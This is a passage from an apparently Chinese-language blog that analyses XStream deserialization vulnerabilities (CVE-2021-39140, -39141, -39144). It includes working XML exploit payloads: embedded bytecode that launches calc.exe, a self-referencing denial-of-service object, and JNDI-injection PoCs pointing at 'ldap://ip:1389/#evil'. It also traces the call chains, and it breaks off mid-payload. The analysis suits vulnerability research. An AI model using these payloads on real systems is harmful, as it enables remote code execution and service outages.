L3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDE2NTkyOTE1MTgwNjAwAQAgTHlzb3NlcmlhbC9Qd25lcjQxNjU5MjkxNTE4MDYwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=&lt;/byte-array&gt;</span><br><span class="line">          &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;</span><br><span class="line">        &lt;/__bytecodes&gt;</span><br><span class="line">        &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;</span><br><span class="line">        &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;</span><br><span class="line">      &lt;/default&gt;</span><br><span class="line">    &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">  &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt;</span><br><span class="line">    &lt;interface&gt;javax.xml.transform.Templates&lt;/interface&gt;</span><br><span class="line">    &lt;handler class=&#x27;sun.reflect.annotation.AnnotationInvocationHandler&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;memberValues&gt;</span><br><span class="line">            &lt;entry&gt;</span><br><span class="line">              &lt;string&gt;f5a5a608&lt;/string&gt;</span><br><span class="line">              &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference=&#x27;../../../../../../../com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;/&gt;</span><br><span class="line">            &lt;/entry&gt;</span><br><span class="line">          &lt;/memberValues&gt;</span><br><span class="line">          &lt;type&gt;javax.xml.transform.Templates&lt;/type&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">    &lt;/handler&gt;</span><br><span class="line">  &lt;/dynamic-proxy&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure>

<p>我jdk版本太高了，复现不了，也懒得下个低版本的复现。利用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    ...</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304122142975.png" alt="image-20230412214204864"></p>
<h2 id="CVE-2021-39140"><a href="#CVE-2021-39140" class="headerlink" title="CVE-2021-39140"></a>CVE-2021-39140</h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成拒绝服务，也是受限于JDK版本，根本原因是重复引用造成死循环，官网POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;sun.reflect.annotation.AnnotationInvocationHandler serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">      &lt;default&gt;</span><br><span class="line">        &lt;memberValues class=&#x27;javax.script.SimpleBindings&#x27;&gt;</span><br><span class="line">          &lt;map class=&#x27;javax.script.SimpleBindings&#x27; reference=&#x27;..&#x27;/&gt;</span><br><span class="line">        &lt;/memberValues&gt;</span><br><span class="line">        &lt;type&gt;javax.xml.transform.Templates&lt;/type&gt;</span><br><span class="line">      &lt;/default&gt;</span><br><span class="line">    &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">  &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure>

<p>我的jdk版本太高，也是复现不了。发生DOS的在这三行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;memberValues class=&#x27;javax.script.SimpleBindings&#x27;&gt;</span><br><span class="line">  &lt;map class=&#x27;javax.script.SimpleBindings&#x27; reference=&#x27;..&#x27;/&gt;</span><br><span class="line">&lt;/memberValues&gt;</span><br></pre></td></tr></table></figure>

<p>发生DOS的在AnnotationInvocationHandler的readObject方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304122205417.png" alt="image-20230412220537335"></p>
<p>调用SimpleBindings对象的entrySet方法，在entrySet方法中又调用了map属性的entrySet：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304122206733.png" alt="image-20230412220656655"></p>
<p>由于map属性引用了自身（SimpleBindings对象），调用map属性的entrySet方法又回到了SimpleBindings对象的entrySet方法，造成了死循环。</p>
<h2 id="CVE-2021-39141"><a href="#CVE-2021-39141" class="headerlink" title="CVE-2021-39141"></a>CVE-2021-39141</h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>39141直接造成JNDI注入，官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;dynamic-proxy&gt;</span><br><span class="line">      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;</span><br><span class="line">      &lt;handler class=&#x27;com.sun.xml.internal.ws.client.sei.SEIStub&#x27;&gt;</span><br><span class="line">        &lt;owner/&gt;</span><br><span class="line">        &lt;managedObjectManagerClosed&gt;false&lt;/managedObjectManagerClosed&gt;</span><br><span class="line">        &lt;databinding class=&#x27;com.sun.xml.internal.ws.db.DatabindingImpl&#x27;&gt;</span><br><span class="line">          &lt;stubHandlers&gt;</span><br><span class="line">            &lt;entry&gt;</span><br><span class="line">              &lt;method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Comparable&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;compareTo&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types&gt;</span><br><span class="line">                  &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">                &lt;/parameter-types&gt;</span><br><span class="line">              &lt;/method&gt;</span><br><span class="line">              &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">                &lt;bodyBuilder class=&#x27;com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit&#x27;&gt;</span><br><span class="line">                  &lt;indices&gt;</span><br><span class="line">                    &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                  &lt;/indices&gt;</span><br><span class="line">                  &lt;getters&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;</span><br><span class="line">                  &lt;/getters&gt;</span><br><span class="line">                  &lt;accessors&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                      &lt;val_-isJAXBElement&gt;false&lt;/val_-isJAXBElement&gt;</span><br><span class="line">                      &lt;val_-getter class=&#x27;com.sun.xml.internal.ws.spi.db.FieldGetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;int&lt;/type&gt;</span><br><span class="line">                        &lt;field&gt;</span><br><span class="line">                          &lt;name&gt;hash&lt;/name&gt;</span><br><span class="line">                          &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                        &lt;/field&gt;</span><br><span class="line">                      &lt;/val_-getter&gt;</span><br><span class="line">                      &lt;val_-isListType&gt;false&lt;/val_-isListType&gt;</span><br><span class="line">                      &lt;val_-n&gt;</span><br><span class="line">                        &lt;namespaceURI/&gt;</span><br><span class="line">                        &lt;localPart&gt;hash&lt;/localPart&gt;</span><br><span class="line">                        &lt;prefix/&gt;</span><br><span class="line">                      &lt;/val_-n&gt;</span><br><span class="line">                      &lt;val_-setter class=&#x27;com.sun.xml.internal.ws.spi.db.MethodSetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;java.lang.String&lt;/type&gt;</span><br><span class="line">                        &lt;method&gt;</span><br><span class="line">                          &lt;class&gt;javax.naming.InitialContext&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;doLookup&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types&gt;</span><br><span class="line">                            &lt;class&gt;java.lang.String&lt;/class&gt;</span><br><span class="line">                          &lt;/parameter-types&gt;</span><br><span class="line">                        &lt;/method&gt;</span><br><span class="line">                      &lt;/val_-setter&gt;</span><br><span class="line">                      &lt;outer-class&gt;</span><br><span class="line">                        &lt;propertySetters&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;serialPersistentFields&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;</span><br><span class="line">                              &lt;field&gt;</span><br><span class="line">                                &lt;name&gt;serialPersistentFields&lt;/name&gt;</span><br><span class="line">                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                              &lt;/field&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;java.util.Comparator&lt;/type&gt;</span><br><span class="line">                              &lt;field&gt;</span><br><span class="line">                                &lt;name&gt;CASE_INSENSITIVE_ORDER&lt;/name&gt;</span><br><span class="line">                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                              &lt;/field&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;serialVersionUID&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;long&lt;/type&gt;</span><br><span class="line">                              &lt;field&gt;</span><br><span class="line">                                &lt;name&gt;serialVersionUID&lt;/name&gt;</span><br><span class="line">                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                              &lt;/field&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;value&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;[C&lt;/type&gt;</span><br><span class="line">                              &lt;field&gt;</span><br><span class="line">                                &lt;name&gt;value&lt;/name&gt;</span><br><span class="line">                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                              &lt;/field&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;hash&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;int&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../../val_-getter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                        &lt;/propertySetters&gt;</span><br><span class="line">                        &lt;propertyGetters&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;serialPersistentFields&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                              &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                              &lt;type&gt;java.util.Comparator&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;serialVersionUID&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                              &lt;type&gt;long&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;value&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                              &lt;type&gt;[C&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;hash&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter reference=&#x27;../../../../val_-getter&#x27;/&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                        &lt;/propertyGetters&gt;</span><br><span class="line">                        &lt;elementLocalNameCollision&gt;false&lt;/elementLocalNameCollision&gt;</span><br><span class="line">                        &lt;contentClass&gt;java.lang.String&lt;/contentClass&gt;</span><br><span class="line">                        &lt;elementDeclaredTypes/&gt;</span><br><span class="line">                      &lt;/outer-class&gt;</span><br><span class="line">                    &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                  &lt;/accessors&gt;</span><br><span class="line">                  &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;</span><br><span class="line">                  &lt;bindingContext class=&#x27;com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper&#x27;/&gt;</span><br><span class="line">                  &lt;dynamicWrapper&gt;false&lt;/dynamicWrapper&gt;</span><br><span class="line">                &lt;/bodyBuilder&gt;</span><br><span class="line">                &lt;isOneWay&gt;false&lt;/isOneWay&gt;</span><br><span class="line">              &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">            &lt;/entry&gt;</span><br><span class="line">          &lt;/stubHandlers&gt;</span><br><span class="line">          &lt;clientConfig&gt;false&lt;/clientConfig&gt;</span><br><span class="line">        &lt;/databinding&gt;</span><br><span class="line">        &lt;methodHandlers&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method reference=&#x27;../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">              &lt;owner reference=&#x27;../../../..&#x27;/&gt;</span><br><span class="line">              &lt;method reference=&#x27;../../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">              &lt;isVoid&gt;false&lt;/isVoid&gt;</span><br><span class="line">              &lt;isOneway&gt;false&lt;/isOneway&gt;</span><br><span class="line">            &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/methodHandlers&gt;</span><br><span class="line">      &lt;/handler&gt;</span><br><span class="line">    &lt;/dynamic-proxy&gt;</span><br><span class="line">    &lt;string&gt;ldap://ip:1389/#evil&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>作者属性给的太全，这里简化了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;dynamic-proxy&gt;</span><br><span class="line">      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;</span><br><span class="line">      &lt;handler class=&#x27;com.sun.xml.internal.ws.client.sei.SEIStub&#x27;&gt;</span><br><span class="line">        &lt;owner/&gt;</span><br><span class="line">        &lt;databinding class=&#x27;com.sun.xml.internal.ws.db.DatabindingImpl&#x27;&gt;</span><br><span class="line">          &lt;stubHandlers&gt;</span><br><span class="line">            &lt;entry&gt;</span><br><span class="line">              &lt;method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Comparable&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;compareTo&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types&gt;</span><br><span class="line">                  &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">                &lt;/parameter-types&gt;</span><br><span class="line">              &lt;/method&gt;</span><br><span class="line">              &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">                &lt;bodyBuilder class=&#x27;com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit&#x27;&gt;</span><br><span class="line">                  &lt;indices&gt;</span><br><span class="line">                    &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                  &lt;/indices&gt;</span><br><span class="line">                  &lt;getters&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;</span><br><span class="line">                  &lt;/getters&gt;</span><br><span class="line">                  &lt;accessors&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                      &lt;val_-getter class=&#x27;com.sun.xml.internal.ws.spi.db.FieldGetter&#x27;&gt;</span><br><span class="line">                        &lt;field&gt;</span><br><span class="line">                          &lt;name&gt;hash&lt;/name&gt;</span><br><span class="line">                          &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                        &lt;/field&gt;</span><br><span class="line">                      &lt;/val_-getter&gt;</span><br><span class="line">                      &lt;val_-setter class=&#x27;com.sun.xml.internal.ws.spi.db.MethodSetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;java.lang.String&lt;/type&gt;</span><br><span class="line">                        &lt;method&gt;</span><br><span class="line">                          &lt;class&gt;javax.naming.InitialContext&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;doLookup&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types&gt;</span><br><span class="line">                            &lt;class&gt;java.lang.String&lt;/class&gt;</span><br><span class="line">                          &lt;/parameter-types&gt;</span><br><span class="line">                        &lt;/method&gt;</span><br><span class="line">                      &lt;/val_-setter&gt;</span><br><span class="line">                    &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                  &lt;/accessors&gt;</span><br><span class="line">                  &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;</span><br><span class="line">                  &lt;bindingContext class=&#x27;com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper&#x27;/&gt;</span><br><span class="line">                &lt;/bodyBuilder&gt;</span><br><span class="line">              &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">            &lt;/entry&gt;</span><br><span class="line">          &lt;/stubHandlers&gt;</span><br><span class="line">        &lt;/databinding&gt;</span><br><span class="line">        &lt;methodHandlers&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method reference=&#x27;../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">              &lt;owner reference=&#x27;../../../..&#x27;/&gt;</span><br><span class="line">              &lt;method reference=&#x27;../../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/methodHandlers&gt;</span><br><span class="line">      &lt;/handler&gt;</span><br><span class="line">    &lt;/dynamic-proxy&gt;</span><br><span class="line">    &lt;string&gt;rmi://127.0.0.1:1097/Object&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>这里同样是PriorityQueue的readObject作为入口点：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131407434.png" alt="image-20230413140718221"></p>
<p>队列存入两个元素，然后调用heapify方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131408740.png" alt="image-20230413140806643"></p>
<p>获取队列第一个元素，即动态代理对象，然后调用siftDown方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131408602.png" alt="image-20230413140859498"></p>
<p>比较器为null，调用siftDownComparable方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131410869.png" alt="image-20230413141016786"></p>
<p>获取队列第二个元素，然后调用第一个元素（动态代理对象）的compareTo方法，这里会执行到SEIStub的invoke方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131412550.png" alt="image-20230413141221438"></p>
<p>检验输入，然后获取compareTo方法的方法处理器MethodHandler，执行方法处理器的invoke方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131414611.png" alt="image-20230413141409498"></p>
<p>invoke方法又调用重载invoke方法，在重载invoke方法里将compareTo方法（对应xml的SyncMethodHandler下的method）包装成JavaCallInfo，然后调用DatabindingImpl的serializeRequest方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131417741.png" alt="image-20230413141728648"></p>
<p>获取compareTo方法的StubHandler，然后调用createRequestPacket方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131419017.png" alt="image-20230413141901924"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131419829.png" alt="image-20230413141940735"></p>
<p>在createRequestPacket方法中，调用createMessage方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131420259.png" alt="image-20230413142007155"></p>
<p>调用this.bulid在方法参数传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131421161.png" alt="image-20230413142136083"></p>
<p>创建一个Object实例赋值给bean临时变量，然后调用getters数组第一个元素的get方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131423442.png" alt="image-20230413142344381"></p>
<p>get方法直接返回方法参数。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131421161.png" alt="image-20230413142136083"></p>
<p>接着调用set方法，第一个为Object实例，第二个rmi字符串。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131427718.png" alt="image-20230413142730610"></p>
<p>继续调用set方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131429638.png" alt="image-20230413142927546"></p>
<p>为方法设置可见性，然后反射调用该方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131430407.png" alt="image-20230413143055343"></p>
<p>JNDI注入点。</p>
<h2 id="CVE-2021-39144"><a href="#CVE-2021-39144" class="headerlink" title="CVE-2021-39144"></a>CVE-2021-39144</h2><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成RCE，官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;dynamic-proxy&gt;</span><br><span class="line">      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;</span><br><span class="line">      &lt;handler class=&#x27;sun.tracing.NullProvider&#x27;&gt;</span><br><span class="line">        &lt;active&gt;true&lt;/active&gt;</span><br><span class="line">        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;</span><br><span class="line">        &lt;probes&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method&gt;</span><br><span class="line">              &lt;class&gt;java.lang.Comparable&lt;/class&gt;</span><br><span class="line">              &lt;name&gt;compareTo&lt;/name&gt;</span><br><span class="line">              &lt;parameter-types&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">              &lt;/parameter-types&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">            